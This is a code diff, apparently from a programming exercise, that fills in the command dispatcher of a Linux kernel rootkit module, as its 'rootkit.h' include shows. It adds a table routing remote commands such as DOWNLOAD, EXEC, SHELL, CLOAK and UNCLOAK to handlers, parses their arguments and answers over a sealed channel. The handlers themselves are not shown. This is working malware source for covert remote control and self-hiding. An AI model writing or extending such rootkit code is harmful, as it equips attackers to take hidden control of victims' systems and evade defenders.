@@ -3,54 +3,68 @@
 #include <linux/string.h>
 #include "rootkit.h"
 
-/*
- * TODO: Define struct rk_dispatch_entry with fields:
- *   - const char *prefix
- *   - size_t prefix_len
- *   - rk_handler_t handler  (function pointer)
- *
- * Build a static const dispatch_table[] array mapping command
- * prefixes to handler functions. Longer prefixes first so
- * "UNHIDE FILE" is tried before "HIDE FILE".
- *
- * Commands with a trailing space in prefix take an argument
- * (everything after the prefix). Commands without trailing space
- * require an exact-length match.
- *
- * Table entries (prefix -> handler):
- *   "DOWNLOAD "  -> cmd_download
- *   "EXEC "      -> cmd_exec
- *   "UNCLOAK"    -> cmd_uncloak
- *   "STATUS"     -> cmd_status
- *   "SHELL"      -> cmd_shell
- *   "CLOAK"      -> cmd_cloak
- *   "PING"       -> cmd_ping
- *   "INFO"       -> cmd_info
- */
+struct rk_dispatch_entry {
+	const char	*prefix;
+	size_t		prefix_len;
+	rk_handler_t	handler;
+};
 
-/*
- * TODO: Implement rk_send_response.
- *
- * Wrap rk_send_sealed: send the response string as sealed data.
- */
-int rk_send_response(struct rk_session *s, const char *resp)
+// Expand this table with all 20 commands.
+// Longer prefixes first (greedy match).
+static const struct rk_dispatch_entry dispatch_table[] = {
+	{ "DOWNLOAD ",  9, cmd_download },
+	{ "EXEC ",      5, cmd_exec     },
+	{ "UNCLOAK",    7, cmd_uncloak  },
+	{ "STATUS",     6, cmd_status   },
+	{ "SHELL",      5, cmd_shell    },
+	{ "CLOAK",      5, cmd_cloak    },
+	{ "PING",       4, cmd_ping     },
+	{ "INFO",       4, cmd_info     },
+};
+
+static size_t strip_trailing(const u8 *buf, size_t len)
 {
-	return -ENOSYS;
+	while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
+			   buf[len - 1] == ' '))
+		len--;
+	return len;
 }
 
-/*
- * TODO: Implement rk_dispatch.
- *
- * 1. Strip trailing whitespace/newlines from buf.
- * 2. Walk the dispatch_table.
- * 3. For each entry, check if buf starts with prefix.
- * 4. If prefix ends with ' ', extract the argument
- *    (copy into a local char arg[RK_ARG_MAX]) and call handler.
- * 5. If prefix does not end with ' ', require exact length match,
- *    then call handler with NULL arg.
- * 6. If no match, send "ERR unknown command".
- */
+int rk_send_response(struct rk_session *s, const char *resp)
+{
+	return rk_send_sealed(s, (const u8 *)resp, strlen(resp));
+}
+
 int rk_dispatch(struct rk_session *s, const u8 *buf, size_t len)
 {
-	return -ENOSYS;
+	size_t i;
+
+	len = strip_trailing(buf, len);
+	if (!len)
+		return rk_send_response(s, "ERR empty command");
+
+	for (i = 0; i < ARRAY_SIZE(dispatch_table); i++) {
+		const struct rk_dispatch_entry *e = &dispatch_table[i];
+
+		if (len < e->prefix_len)
+			continue;
+		if (memcmp(buf, e->prefix, e->prefix_len) != 0)
+			continue;
+
+		if (e->prefix[e->prefix_len - 1] == ' ') {
+			char arg[RK_ARG_MAX];
+			size_t arg_len = len - e->prefix_len;
+
+			if (arg_len >= RK_ARG_MAX)
+				arg_len = RK_ARG_MAX - 1;
+			memcpy(arg, buf + e->prefix_len, arg_len);
+			arg[arg_len] = '\0';
+			return e->handler(s, arg);
+		}
+
+		if (len == e->prefix_len)
+			return e->handler(s, NULL);
+	}
+
+	return rk_send_response(s, "ERR unknown command");
 }
